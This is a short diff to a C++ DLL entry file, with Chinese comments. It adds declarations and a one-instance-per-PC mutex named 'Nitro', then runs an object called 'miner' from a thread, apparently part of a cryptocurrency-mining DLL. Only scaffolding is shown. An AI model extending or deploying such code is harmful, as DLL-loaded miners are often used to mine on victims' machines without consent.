@@ -33,7 +33,15 @@
 
 // dllmain.cpp : 定义 DLL 应用程序的入口点。
 
+/************************************************************************/
+
+DWORD WINAPI MyMain(LPVOID lpParam);
+LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo);
+
 HMODULE g_hDllModule; //定义Dll本身的句柄，方便自身函数回调
+
+					  
+/************************************************************************/
 
 
 BOOL APIENTRY DllMain(HMODULE hModule,
@@ -110,7 +118,7 @@ DWORD WINAPI MyMain(LPVOID lpParam)
 
 		hInstallMutex = CreateMutex(NULL, true, L"Nitro");  //该互斥体是只允许一台PC拥有一个实例
 
-		App miner(NULL, 0);
+		App miner;
 		return miner.exec();
 	
 	}
